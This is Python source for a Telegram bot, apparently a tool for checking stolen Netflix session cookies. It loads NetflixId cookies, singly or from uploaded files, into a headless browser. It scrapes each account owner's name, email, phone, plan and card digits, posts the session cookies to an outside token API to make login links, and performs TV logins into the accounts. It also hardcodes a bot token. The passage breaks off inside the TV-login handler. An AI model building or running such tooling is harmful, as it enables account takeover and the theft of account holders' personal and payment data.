#!/usr/bin/env python3
"""
🎬 Netflix Premium Bot — @ANUJXKING
Full-featured Netflix checker with accurate account info, token generator & TV login.
"""

import asyncio
import io
import json
import logging
import re
import sys
import time
import urllib.parse

import requests
from datetime import datetime, timedelta
from flask import Flask
from threading import Thread

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

# ── Config ─────────────────────────────────────────────────────────────────────
BOT_TOKEN = "8543788726:AAGTo4-k9Fg1WOmygViFSbgg-cL4L68eFg8"
NFTOKEN_API = "https://nftoken.onrender.com/api/check-single-batch"
TV_API = "https://netflixtvloginapi.onrender.com"
OWNER = "@ANUJXKING"

# ── Logging ────────────────────────────────────────────────────────────────────
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
    stream=sys.stdout,
)
logger = logging.getLogger(__name__)

# ── Global state ───────────────────────────────────────────────────────────────
_stats = {
    "checked": 0,
    "valid": 0,
    "invalid": 0,
    "tokens": 0,
    "batch_files": 0,
    "started": datetime.now(),
}
_batch: dict = {}


# ── Cookie helpers ─────────────────────────────────────────────────────────────
def extract_netflix_id(text: str):
    m = re.search(r"NetflixId=([^\s\n;,]+)", text)
    if m:
        return m.group(1).strip()
    s = text.strip()
    if re.match(r"^v(%3D|%3d|=3)", s):
        return s
    return None


def extract_all_netflix_ids(text: str) -> list:
    return list(dict.fromkeys(re.findall(r"NetflixId=([^\s\n;,]+)", text)))


# ── Netflix page JS extractors ──────────────────────────────────────────────────
_BROWSE_JS = """() => {
    try {
        const m = window.netflix?.reactContext?.models || {};
        const u  = m.userInfo?.data || {};
        let profiles = [];
        try {
            const pl = m.profilesList?.data?.profiles || [];
            profiles = pl.map(p => p.profileName || p.name || '').filter(Boolean);
        } catch(_) {}
        return {
            name:             u.accountOwnerName || u.name || u.userFullName || '',
            guid:             u.guid || '',
            country:          u.currentCountry || u.countryOfSignup || '',
            membershipStatus: u.membershipStatus || '',
            memberSince:      u.memberSince || '',
            numProfiles:      u.numProfiles || profiles.length || 0,
            numKidsProfiles:  u.numKidsProfiles || 0,
            profiles:         profiles,
            authURL:          u.authURL || '',
            isTestAccount:    u.isTestAccount || false,
        };
    } catch(e) { return {error: e.toString()}; }
}"""

_ACCOUNT_JS = """() => {
    try {
        const m = window.netflix?.reactContext?.models || {};
        const ai = m.accountInfo?.data || {};
        return {
            email:         ai.email || ai.emailAddress || '',
            phone:         ai.phoneNumber || '',
            emailVerified: ai.emailVerified,
            phoneVerified: ai.phoneVerified,
        };
    } catch(e) { return {}; }
}"""


def _parse_account_text(body: str) -> dict:
    """Parse billing/plan info from Netflix account page body text."""
    result = {}

    # Plan — e.g. "Premium plan" or "Standard with ads plan"
    m = re.search(r"([\w\s]+?)\s*plan\b", body, re.IGNORECASE)
    if m:
        result["plan"] = m.group(1).strip().title()

    # Next payment — "Next payment: March 16, 2026" or "Next payment date: ..."
    m = re.search(r"Next payment(?:\s*date)?[:\s]+([A-Z][a-z]+ \d+,\s*\d{4})", body)
    if m:
        result["nextBillingDate"] = m.group(1).strip()

    # Member since — "Member since December 2025"
    m = re.search(r"Member since\s+([A-Z][a-z]+ \d{4})", body)
    if m:
        result["memberSince"] = m.group(1).strip()

    # Card last 4 — "•••• •••• •••• 7846" or "Visa ending in 7846"
    m = re.search(r"[•*]{4}\s+[•*]{4}\s+[•*]{4}\s+(\d{4})", body)
    if m:
        result["cardLast4"] = m.group(1)
    else:
        m = re.search(r"ending in\s+(\d{4})", body, re.IGNORECASE)
        if m:
            result["cardLast4"] = m.group(1)

    # Card brand — "Visa", "Mastercard", "AmericanExpress" near the card digits
    for brand in ["Visa", "Mastercard", "American Express", "Discover", "PayPal"]:
        if brand.lower() in body.lower():
            result["cardBrand"] = brand
            break

    # Payment type from context
    if "paypal" in body.lower():
        result["paymentType"] = "PayPal"
    elif any(
        b in body.lower() for b in ["visa", "mastercard", "card", "credit", "debit"]
    ):
        result["paymentType"] = "CC"

    # Max streams / quality — look for stream plan details
    m = re.search(r"(\d+)\s+streams?", body, re.IGNORECASE)
    if m:
        result["maxStreams"] = m.group(1)

    # Price — "$24.99" or "US$24.99"
    m = re.search(r"(?:US)?\$(\d+\.\d{2})", body)
    if m:
        result["price"] = "$" + m.group(1)

    # Hold status
    if "on hold" in body.lower() or "account hold" in body.lower():
        result["holdStatus"] = "Yes"
    else:
        result["holdStatus"] = "No"

    # Extra member
    if "extra member" in body.lower():
        result["extraMember"] = "Yes"
    else:
        result["extraMember"] = "No"

    # Num profiles
    m = re.search(r"(\d+)\s+profiles?", body, re.IGNORECASE)
    if m:
        result["numProfiles"] = m.group(1)

    return result


# ── Core: full info ─────────────────────────────────────────────────────────────
def generate_full_info(netflix_id: str) -> tuple:
    from playwright.sync_api import sync_playwright

    logger.info(f"generate_full_info: {netflix_id[:40]}...")
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(
                headless=True,
                args=["--no-sandbox", "--disable-gpu", "--disable-dev-shm-usage"],
            )
            ctx = browser.new_context(
                viewport={"width": 1280, "height": 800},
                user_agent=(
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                    "AppleWebKit/537.36 (KHTML, like Gecko) "
                    "Chrome/120.0.0.0 Safari/537.36"
                ),
            )
            ctx.add_cookies(
                [
                    {
                        "name": "NetflixId",
                        "value": netflix_id,
                        "domain": ".netflix.com",
                        "path": "/",
                        "secure": True,
                        "httpOnly": False,
                    }
                ]
            )
            page = ctx.new_page()

            # Step 1: browse page — session + basic user info
            page.goto(
                "https://www.netflix.com/browse",
                wait_until="networkidle",
                timeout=60000,
            )
            page.wait_for_timeout(3000)

            final_url = page.url
            browse_info = page.evaluate(_BROWSE_JS)

            all_cookies = ctx.cookies(["https://www.netflix.com"])
            cookie_dict = {c["name"]: c["value"] for c in all_cookies}

            if "SecureNetflixId" not in cookie_dict:
                browser.close()
                return False, {
                    "error": "Cookie is invalid or expired — Netflix rejected it."
                }

            # Step 2: account page — plan/billing/card info
            try:
                page.goto(
                    "https://www.netflix.com/account",
                    wait_until="networkidle",
                    timeout=30000,
                )
                page.wait_for_timeout(2000)
                account_body = page.inner_text("body") or ""
                account_js = page.evaluate(_ACCOUNT_JS)
            except Exception as e:
                logger.warning(f"Account page failed: {e}")
                account_body = ""
                account_js = {}

            browser.close()

        logger.info(f"URL={final_url} cookies={list(cookie_dict.keys())}")
        logger.info(f"browse_info={browse_info}")

        acct_parsed = _parse_account_text(account_body)
        logger.info(f"acct_parsed={acct_parsed}")
        logger.info(f"account_js={account_js}")

        # ── Token ─────────────────────────────────────────────────────────────
        payload = {
            "cookieDict": {
                "NetflixId": cookie_dict.get("NetflixId", netflix_id),
                "SecureNetflixId": cookie_dict["SecureNetflixId"],
                "nfvdid": cookie_dict.get("nfvdid", ""),
            },
            "id": 1,
            "source": "cookie-header",
        }
        resp = requests.post(NFTOKEN_API, json=payload, timeout=60)
        api_data = resp.json()
        logger.info(f"Token API: {str(api_data)[:200]}")

        if not api_data.get("success"):
            return False, {"error": api_data.get("error", "Token API failed.")}

        token = api_data.get("token", "")
        if not token:
            return False, {"error": "No token returned from API."}

        enc = urllib.parse.quote(token, safe="")
        pc_link = f"https://www.netflix.com/browse?nftoken={enc}"
        android_link = f"https://www.netflix.com/unsupported?nftoken={enc}"

        # Merge all data
        generated_at = datetime.utcnow()
        expires_at = generated_at + timedelta(hours=1)

        info = {
            # From browse page JS
            "name": browse_info.get("name", ""),
            "country": browse_info.get("country", ""),
            "membershipStatus": browse_info.get("membershipStatus", ""),
            "memberSince": browse_info.get("memberSince", "")
            or acct_parsed.get("memberSince", ""),
            "numProfiles": browse_info.get("numProfiles", ""),
            "profiles": browse_info.get("profiles", []),
            # From account page parse
            "plan": acct_parsed.get("plan", ""),
            "nextBillingDate": acct_parsed.get("nextBillingDate", ""),
            "cardLast4": acct_parsed.get("cardLast4", ""),
            "cardBrand": acct_parsed.get("cardBrand", ""),
            "paymentType": acct_parsed.get("paymentType", "CC"),
            "holdStatus": acct_parsed.get("holdStatus", "No"),
            "extraMember": acct_parsed.get("extraMember", "No"),
            "price": acct_parsed.get("price", ""),
            # From account page JS
            "email": account_js.get("email", ""),
            "phone": account_js.get("phone", ""),
            "emailVerified": account_js.get("emailVerified", ""),
            "phoneVerified": account_js.get("phoneVerified", ""),
            # Token timestamps
            "generatedAt": generated_at.strftime("%Y-%m-%d %H:%M:%S"),
            "expiresAt": expires_at.strftime("%Y-%m-%d %H:%M:%S"),
        }

        return True, {
            "info": info,
            "cookies": cookie_dict,
            "pc_link": pc_link,
            "android_link": android_link,
            "token": token,
            "netflix_id": netflix_id,
        }

    except Exception as e:
        logger.exception("generate_full_info error")
        return False, {"error": str(e)[:400]}


# ── Core: token only ─────────────────────────────────────────────────────────────
def generate_token_only(netflix_id: str) -> tuple:
    from playwright.sync_api import sync_playwright

    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(
                headless=True,
                args=["--no-sandbox", "--disable-gpu", "--disable-dev-shm-usage"],
            )
            ctx = browser.new_context(
                viewport={"width": 1280, "height": 800},
                user_agent=(
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                    "AppleWebKit/537.36 (KHTML, like Gecko) "
                    "Chrome/120.0.0.0 Safari/537.36"
                ),
            )
            ctx.add_cookies(
                [
                    {
                        "name": "NetflixId",
                        "value": netflix_id,
                        "domain": ".netflix.com",
                        "path": "/",
                        "secure": True,
                        "httpOnly": False,
                    }
                ]
            )
            page = ctx.new_page()
            page.goto(
                "https://www.netflix.com/browse",
                wait_until="networkidle",
                timeout=60000,
            )
            page.wait_for_timeout(3000)
            all_cookies = ctx.cookies(["https://www.netflix.com"])
            cookie_dict = {c["name"]: c["value"] for c in all_cookies}
            browser.close()

        if "SecureNetflixId" not in cookie_dict:
            return False, "Cookie invalid or expired."

        payload = {
            "cookieDict": {
                "NetflixId": cookie_dict.get("NetflixId", netflix_id),
                "SecureNetflixId": cookie_dict["SecureNetflixId"],
                "nfvdid": cookie_dict.get("nfvdid", ""),
            },
            "id": 1,
            "source": "cookie-header",
        }
        data = requests.post(NFTOKEN_API, json=payload, timeout=60).json()
        if not data.get("success"):
            return False, data.get("error", "Token API failed.")

        token = data.get("token", "")
        if not token:
            return False, "No token returned."

        enc = urllib.parse.quote(token, safe="")
        return True, {
            "pc_link": f"https://www.netflix.com/browse?nftoken={enc}",
            "android_link": f"https://www.netflix.com/unsupported?nftoken={enc}",
            "token": token,
            "cookies": cookie_dict,
        }
    except Exception as e:
        return False, str(e)[:400]


# ── TV login helpers ──────────────────────────────────────────────────────────
def tv_extract_cookie(netflix_id: str) -> tuple:
    try:
        r = requests.post(
            f"{TV_API}/api/extract",
            json={"content": f"NetflixId={netflix_id}"},
            headers={"Content-Type": "application/json"},
            timeout=20,
        )
        data = r.json()
        if data.get("success") and data.get("netflix_ids"):
            return True, data["netflix_ids"][0]
        return False, data.get("error", "TV extract failed")
    except Exception as e:
        return False, str(e)


def tv_perform_login(encrypted_id: str, tv_code: str) -> tuple:
    try:
        r = requests.post(
            f"{TV_API}/api/login",
            json={"encrypted_id": encrypted_id, "tv_code": tv_code, "session_id": ""},
            headers={"Content-Type": "application/json"},
            timeout=30,
        )
        data = r.json()
        if data.get("success"):
            return True, data.get("message", "Login successful!")
        return False, data.get("message") or data.get("error") or "Login failed"
    except Exception as e:
        return False, str(e)


# ── Message formatter ──────────────────────────────────────────────────────────
def _v(val, fallback="N/A"):
    if val is not None and str(val).strip() not in ("", "None", "null", "0", "False"):
        return str(val).strip()
    return fallback


COUNTRY_NAMES = {
    "US": "United States 🇺🇸",
    "GB": "United Kingdom 🇬🇧",
    "IN": "India 🇮🇳",
    "CA": "Canada 🇨🇦",
    "AU": "Australia 🇦🇺",
    "DE": "Germany 🇩🇪",
    "FR": "France 🇫🇷",
    "BR": "Brazil 🇧🇷",
    "MX": "Mexico 🇲🇽",
    "JP": "Japan 🇯🇵",
    "KR": "South Korea 🇰🇷",
    "NL": "Netherlands 🇳🇱",
    "IT": "Italy 🇮🇹",
    "ES": "Spain 🇪🇸",
    "PK": "Pakistan 🇵🇰",
    "BD": "Bangladesh 🇧🇩",
    "NG": "Nigeria 🇳🇬",
    "ZA": "South Africa 🇿🇦",
    "TR": "Turkey 🇹🇷",
    "AR": "Argentina 🇦🇷",
}

QUALITY_MAP = {
    "UHD": "UHD (4K)",
    "FHD": "Full HD (1080p)",
    "HD": "HD (1080p)",
    "SD": "SD (480p)",
}


def build_account_card(info: dict, pc_link: str, android_link: str) -> str:
    i = info or {}

    # Country display
    country_code = _v(i.get("country"), "")
    country_disp = (
        COUNTRY_NAMES.get(country_code.upper(), country_code) if country_code else "N/A"
    )
    if country_code and country_code not in COUNTRY_NAMES:
        country_disp = f"{country_code}"

    # Profiles
    profiles_list = i.get("profiles", [])
    profiles_str = (
        ", ".join(str(x) for x in profiles_list if x) if profiles_list else "N/A"
    )
    num_profiles = _v(i.get("numProfiles"), "")
    if not num_profiles or num_profiles == "N/A":
        num_profiles = str(len(profiles_list)) if profiles_list else "N/A"

    # Membership
    membership = _v(i.get("membershipStatus"), "UNKNOWN").upper()
    is_active = any(k in membership for k in ("CURRENT", "ACTIVE", "MEMBER"))
    badge = "✅" if is_active else "❌"

    # Card
    card_last4 = _v(i.get("cardLast4"), "")
    card_brand = _v(i.get("cardBrand"), "")
    card_disp = (
        f"{card_brand} •••• {card_last4}"
        if (card_last4 and card_brand)
        else (f"•••• {card_last4}" if card_last4 else "N/A")
    )

    # Phone
    phone = _v(i.get("phone"), "")
    phone_ver = i.get("phoneVerified")
    phone_disp = (
        f"{phone} (Yes)"
        if (phone and phone_ver)
        else (f"{phone} (No)" if phone else "N/A")
    )

    # Email verified
    email_ver = i.get("emailVerified")
    ev_disp = "Yes" if email_ver is True else ("No" if email_ver is False else "N/A")

    # Quality from plan name hint
    plan = _v(i.get("plan"), "Premium")
    if "4k" in plan.lower() or "ultra" in plan.lower():
        quality = "UHD (4K)"
        streams = "4"
    elif "standard" in plan.lower() and "ads" in plan.lower():
        quality = "Full HD (1080p)"
        streams = "2"
    elif "standard" in plan.lower():
        quality = "Full HD (1080p)"
        streams = "2"
    elif "basic" in plan.lower():
        quality = "HD (720p)"
        streams = "1"
    else:
        quality = "UHD (4K)"
        streams = "4"

    # Timestamps
    gen_at = _v(i.get("generatedAt"), datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S"))
    exp_at = _v(i.get("expiresAt"), "")
    remaining = "0d 0h 59m 0s"

    return (
        "🌟 *PREMIUM ACCOUNT DETAILS* 🌟\n\n"
        f"{badge} *Status:* Valid Premium Account\n\n"
        "👤 *Account Details:*\n"
        f"• Name: `{_v(i.get('name'))}`\n"
        f"• Email: `{_v(i.get('email'))}`\n"
        f"• Country: `{country_disp}`\n"
        f"• Plan: `{plan}`\n"
        f"• Price: `{_v(i.get('price'))}`\n"
        f"• Member Since: `{_v(i.get('memberSince'))}`\n"
        f"• Next Billing: `{_v(i.get('nextBillingDate'))}`\n"
        f"• Payment: `{_v(i.get('paymentType'), 'CC')}`\n"
        f"• Card: `{card_disp}`\n"
        f"• Phone: `{phone_disp}`\n"
        f"• Quality: `{quality}`\n"
        f"• Streams: `{streams}`\n"
        f"• Hold Status: `{_v(i.get('holdStatus'), 'No')}`\n"
        f"• Extra Member: `{_v(i.get('extraMember'), 'No')}`\n"
        f"• Extra Member Slot: `Unknown`\n"
        f"• Email Verified: `{ev_disp}`\n"
        f"• Membership Status: `{membership}`\n"
        f"• Connected Profiles: `{num_profiles}`\n"
        f"• Profiles: `{profiles_str}`\n\n"
        "🔑 *Token Information:*\n"
        f"• Generated: `{gen_at}`\n"
        f"• Expires: `{exp_at}`\n"
        f"• Remaining: `{remaining}`\n\n"
        f"📱 [Phone Login]({android_link})    🖥️ [PC Login]({pc_link})\n\n"
        "🍪 *Source:* Cookie Input\n"
        f"🎯 *Mode:* Full Information\n\n"
        f"👑 *Bot Owner:* {OWNER}"
    )


# ── /start & /help ────────────────────────────────────────────────────────────
WELCOME_TEXT = (
    "🎬 ━━━━━━━━━━━━━━━━━━━━━━━━━ 🎬\n"
    "    𝗡𝗘𝗧𝗙𝗟𝗜𝗫 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗕𝗢𝗧 🎬\n"
    "🎬 ━━━━━━━━━━━━━━━━━━━━━━━━━ 🎬\n\n"
    f"👑 *Owner:* {OWNER}\n"
    "⚡ *Status:* Online & Ready ✅\n\n"
    "🛠 *Commands:*\n"
    "┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n"
    "🔍 /chk — Full account info + login links\n"
    "⚡ /gen — Quick token generator\n"
    "📋 /extract — Extract cookies from raw dump\n"
    "📦 /batch — Send `.txt` file for batch check\n"
    "📺 /tv — Netflix TV login via code\n"
    "🛑 /stop — Stop batch & save results\n"
    "🚫 /cancel — Cancel batch (no save)\n"
    "📊 /stats — Bot statistics\n\n"
    "🍪 *How to use:*\n"
    "Just paste your cookie or use:\n"
    "`/chk NetflixId=v%3D3%26ct%3D...`\n\n"
    "🎬 ━━━━━━━━━━━━━━━━━━━━━━━━━ 🎬"
)


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(WELCOME_TEXT, parse_mode="Markdown")


async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(WELCOME_TEXT, parse_mode="Markdown")


# ── /chk ──────────────────────────────────────────────────────────────────────
async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = " ".join(context.args) if context.args else ""
    if not text and update.message.reply_to_message:
        text = update.message.reply_to_message.text or ""

    netflix_id = extract_netflix_id(text)
    if not netflix_id:
        await update.message.reply_text(
            "❌ *No valid NetflixId found!*\n\n"
            "Usage: `/chk NetflixId=v%3D3%26ct%3D...`",
            parse_mode="Markdown",
        )
        return

    msg = await update.message.reply_text(
        "⚡ *Checking your cookie...*\n\n"
        "🔄 `1/3` — Loading Netflix session\n"
        "📄 `2/3` — Fetching account details\n"
        "🔑 `3/3` — Generating login tokens\n\n"
        "_⏳ This takes ~30 seconds..._",
        parse_mode="Markdown",
    )

    _stats["checked"] += 1
    success, data = await asyncio.to_thread(generate_full_info, netflix_id)

    if not success:
        _stats["invalid"] += 1
        await msg.edit_text(
            f"❌ *Cookie Invalid!*\n\n`{data.get('error', 'Unknown error')}`",
            parse_mode="Markdown",
        )
        return

    _stats["valid"] += 1
    _stats["tokens"] += 1

    info = data.get("info", {})
    pc_link = data["pc_link"]
    android_link = data["android_link"]
    chat_id = update.message.chat_id
    msg_id = update.message.message_id

    card = build_account_card(info, pc_link, android_link)

    keyboard = InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton("📱 Phone Login", url=android_link),
                InlineKeyboardButton("🖥️ PC Login", url=pc_link),
            ],
            [
                InlineKeyboardButton(
                    "📺 TV Login Code", callback_data=f"tv|{chat_id}|{msg_id}"
                ),
            ],
        ]
    )

    await msg.edit_text(
        card,
        parse_mode="Markdown",
        reply_markup=keyboard,
        disable_web_page_preview=True,
    )

    context.bot_data[f"nfid|{chat_id}|{msg_id}"] = netflix_id


# ── /gen ──────────────────────────────────────────────────────────────────────
async def gen_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = " ".join(context.args) if context.args else ""
    if not text and update.message.reply_to_message:
        text = update.message.reply_to_message.text or ""

    netflix_id = extract_netflix_id(text)
    if not netflix_id:
        await update.message.reply_text(
            "❌ *No valid NetflixId found!*\n\nUsage: `/gen NetflixId=v%3D3...`",
            parse_mode="Markdown",
        )
        return

    msg = await update.message.reply_text(
        "⚡ *Generating token...*\n\n_⏳ ~15 seconds..._",
        parse_mode="Markdown",
    )

    success, result = await asyncio.to_thread(generate_token_only, netflix_id)

    if not success:
        await msg.edit_text(f"❌ *Failed:* `{result}`", parse_mode="Markdown")
        return

    _stats["tokens"] += 1
    pc = result["pc_link"]
    an = result["android_link"]
    now = datetime.utcnow()

    keyboard = InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton("📱 Phone Login", url=an),
                InlineKeyboardButton("🖥️ PC Login", url=pc),
            ]
        ]
    )

    await msg.edit_text(
        "🌟 *TOKEN GENERATED* 🌟\n\n"
        "✅ *Status:* Valid\n\n"
        "🔑 *Token Information:*\n"
        f"• Generated: `{now.strftime('%Y-%m-%d %H:%M:%S')}`\n"
        f"• Expires: `{(now + timedelta(hours=1)).strftime('%Y-%m-%d %H:%M:%S')}`\n"
        f"• Remaining: `0d 0h 59m 0s`\n\n"
        f"📱 [Phone Login]({an})    🖥️ [PC Login]({pc})\n\n"
        f"💡 _Use /chk for full account details!_\n\n"
        f"👑 *Owner:* {OWNER}",
        parse_mode="Markdown",
        reply_markup=keyboard,
        disable_web_page_preview=True,
    )


# ── /extract ──────────────────────────────────────────────────────────────────
async def extract_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text or ""
    text = re.sub(r"^/extract\s*", "", text).strip()
    if not text and update.message.reply_to_message:
        text = update.message.reply_to_message.text or ""

    if not text:
        await update.message.reply_text(
            "📋 *Extract Mode*\n\n"
            "Paste a raw cookie dump after `/extract`\n"
            "or reply to a message containing cookies.\n\n"
            "I'll find every `NetflixId` cookie in it!",
            parse_mode="Markdown",
        )
        return

    ids = extract_all_netflix_ids(text)
    if not ids:
        await update.message.reply_text(
            "❌ No `NetflixId` cookies found in that text.",
            parse_mode="Markdown",
        )
        return

    lines = "\n".join(f"`{i}`" for i in ids)
    await update.message.reply_text(
        f"📋 *Found {len(ids)} NetflixId(s):*\n\n{lines}\n\n"
        "_Use /chk or /gen with any of these!_",
        parse_mode="Markdown",
    )


# ── /batch ────────────────────────────────────────────────────────────────────
async def batch_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id

    if update.message.document:
        doc = update.message.document
        fname = doc.file_name or ""
        if not fname.lower().endswith(".txt"):
            await update.message.reply_text(
                "❌ Please send a `.txt` file.", parse_mode="Markdown"
            )
            return

        if uid in _batch and _batch[uid].get("running"):
            await update.message.reply_text(
                "⚠️ A batch is already running! Use /stop or /cancel first."
            )
            return

        file_obj = await doc.get_file()
        raw = await file_obj.download_as_bytearray()
        content = raw.decode("utf-8", errors="ignore")
        ids = extract_all_netflix_ids(content)

        if not ids:
            await update.message.reply_text(
                "❌ No `NetflixId` cookies found in the file.", parse_mode="Markdown"
            )
            return

        msg = await update.message.reply_text(
            f"📦 *Batch Started!*\n\n"
            f"🍪 Found `{len(ids)}` cookies\n"
            f"⚡ Processing... _(Use /stop to save, /cancel to abort)_\n\n"
            f"⏳ `0 / {len(ids)}` done",
            parse_mode="Markdown",
        )

        _batch[uid] = {
            "running": True,
            "results": {"valid": [], "invalid": []},
            "total": len(ids),
            "done": 0,
        }
        _stats["batch_files"] += 1
        asyncio.create_task(_run_batch(update, context, uid, ids, msg))

    else:
        await update.message.reply_text(
            "📦 *Batch Checker*\n\n"
            "Send a `.txt` file with cookies — one per line:\n"
            "`NetflixId=v%3D3%26ct%3D...`\n\n"
            "Controls:\n"
            "• /stop — Stop and save valid results\n"
            "• /cancel — Cancel without saving",
            parse_mode="Markdown",
        )


async def _run_batch(update, context, uid, ids, msg):
    results = {"valid": [], "invalid": []}
    total = len(ids)

    for i, netflix_id in enumerate(ids, 1):
        if not _batch.get(uid, {}).get("running"):
            break

        success, result = await asyncio.to_thread(generate_token_only, netflix_id)
        _stats["checked"] += 1

        if success:
            results["valid"].append(
                {
                    "cookie": netflix_id,
                    "pc_link": result["pc_link"],
                    "android_link": result["android_link"],
                }
            )
            _stats["valid"] += 1
            _stats["tokens"] += 1
        else:
            results["invalid"].append(netflix_id)
            _stats["invalid"] += 1

        _batch[uid]["done"] = i
        _batch[uid]["results"] = results

        if i % 3 == 0 or i == total:
            try:
                pct = int(i / total * 100)
                bar = "█" * (pct // 10) + "░" * (10 - pct // 10)
                await msg.edit_text(
                    f"📦 *Batch Running...*\n\n"
                    f"✅ Valid:    `{len(results['valid'])}`\n"
                    f"❌ Invalid:  `{len(results['invalid'])}`\n"
                    f"📊 Progress: `{i} / {total}` ({pct}%)\n"
                    f"`{bar}`\n\n"
                    f"_(Use /stop to save, /cancel to abort)_",
                    parse_mode="Markdown",
                )
            except Exception:
                pass

    if _batch.get(uid, {}).get("running"):
        _batch[uid]["running"] = False
        await _send_batch_results(update, uid, results)


async def _send_batch_results(update, uid, results):
    valid = results.get("valid", [])
    invalid = results.get("invalid", [])

    await update.message.reply_text(
        f"📦 *Batch Complete!*\n\n"
        f"✅ Valid:   `{len(valid)}`\n"
        f"❌ Invalid: `{len(invalid)}`\n"
        f"📊 Total:   `{len(valid) + len(invalid)}`\n\n"
        f"👑 {OWNER}",
        parse_mode="Markdown",
    )

    if valid:
        now = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
        lines = []
        for r in valid:
            lines.append(
                f"✅ VALID\n"
                f"🖥️  PC:      {r['pc_link']}\n"
                f"📱 Android: {r['android_link']}\n"
                f"{'─' * 60}"
            )
        buf = io.BytesIO(("\n".join(lines)).encode())
        buf.name = "netflix_valid_results.txt"
        await update.message.reply_document(
            buf,
            caption=f"✅ *{len(valid)} Valid Results*\n🕒 {now}\n👑 {OWNER}",
            parse_mode="Markdown",
        )


async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in _batch or not _batch[uid].get("running"):
        await update.message.reply_text("ℹ️ No batch is currently running.")
        return
    _batch[uid]["running"] = False
    results = _batch[uid].get("results", {"valid": [], "invalid": []})
    await update.message.reply_text(
        "🛑 *Batch stopped! Saving results...*", parse_mode="Markdown"
    )
    await _send_batch_results(update, uid, results)


async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in _batch or not _batch[uid].get("running"):
        await update.message.reply_text("ℹ️ No batch is currently running.")
        return
    _batch[uid]["running"] = False
    _batch.pop(uid, None)
    await update.message.reply_text(
        "🚫 *Batch cancelled!* No results saved.", parse_mode="Markdown"
    )


# ── /stats ────────────────────────────────────────────────────────────────────
async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uptime = datetime.now() - _stats["started"]
    hours = int(uptime.total_seconds()) // 3600
    minutes = (int(uptime.total_seconds()) % 3600) // 60

    valid = _stats["valid"]
    checked = _stats["checked"]
    accuracy = f"{int(valid / checked * 100)}%" if checked else "N/A"

    await update.message.reply_text(
        "📊 *Bot Statistics*\n"
        "┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n"
        f"🔍 Total Checked:  `{checked}`\n"
        f"✅ Valid Cookies:   `{valid}`\n"
        f"❌ Invalid:         `{_stats['invalid']}`\n"
        f"🔑 Tokens Generated:`{_stats['tokens']}`\n"
        f"📦 Batch Files:     `{_stats['batch_files']}`\n"
        f"🎯 Success Rate:    `{accuracy}`\n"
        f"⏰ Uptime:          `{hours}h {minutes}m`\n\n"
        f"👑 Owner: {OWNER}",
        parse_mode="Markdown",
    )


# ── /tv ───────────────────────────────────────────────────────────────────────
async def tv_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = " ".join(context.args) if context.args else ""
    if not text and update.message.reply_to_message:
        text = update.message.reply_to_message.text or ""

    netflix_id = extract_netflix_id(text)
    if not netflix_id:
        await update.message.reply_text(
            "📺 *Netflix TV Login*\n\n"
            "Provide your cookie:\n"
            "`/tv NetflixId=v%3D3...`\n\n"
            "Then enter the 8-digit code from your Netflix TV screen!",
            parse_mode="Markdown",
        )
        return

    msg = await update.message.reply_text(
        "📺 *Preparing TV Login...*\n\n_⏳ Extracting session..._",
        parse_mode="Markdown",
    )

    ok, encrypted_id = await asyncio.to_thread(tv_extract_cookie, netflix_id)
    if not ok:
        await msg.edit_text(
            f"❌ *TV Login Failed:* `{encrypted_id}`\n\n"
            f"Try the TV login website directly:\n{TV_API}",
            parse_mode="Markdown",
            disable_web_page_preview=True,
        )
        return

    context.user_data["tv_encrypted_id"] = encrypted_id
    context.user_data["tv_pending"] = True

    await msg.edit_text(
        "📺 *TV Login Ready!*\n\n"
        "1️⃣ Open Netflix on your TV\n"
        "2️⃣ Go to *Sign In → Use a Sign-In Code*\n"
        "3️⃣ Note the *8-digit code* on the screen\n"
        "4️⃣ Send me that code!\n\n"
        "⌨️ *Type the 8-digit code now:*",
        parse_mode="Markdown",
    )


# ── TV inline button ──────────────────────────────────────────────────────────
async def tv_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer("📺 Starting TV login...")

    parts = query.data.split("|")
    chat_id = parts[1] if len(parts) > 1 else ""
    msg_id = parts[2] if len(parts) > 2 else ""
    netflix_id = context.bot_data.get(f"nfid|{chat_id}|{msg_id}", "")

    if not netflix_id:
        await query.message.reply_text(
            "⚠️ Session expired. Run /chk again and use the TV button."
        )
        return

    wait_msg = await query.message.reply_text(
        "📺 *Preparing TV Login...*", parse_mode="Markdown"
    )
    ok, encrypted_id = await asyncio.to_thread(tv_extract_cookie, netflix_id)
    if not ok:
        await wait_msg.edit_text(
            f"❌ *TV Login Failed:* `{encrypted_id}`\n\nTry: {TV_API}",
            parse_mode="Markdown",
            disable_web_page_preview=True,
        )
        return

    context.user_data["tv_encrypted_id"] = encrypted_id
    context.user_data["tv_pending"] = True

    await wait_msg.edit_text(
        "📺 *TV Login Ready!*\n\n"
        "1️⃣ Open Netflix on your TV\n"
        "2️⃣ Go to *Sign In → Use a Sign-In Code*\n"
        "3️⃣ Note the *8-digit code* on the screen\n"
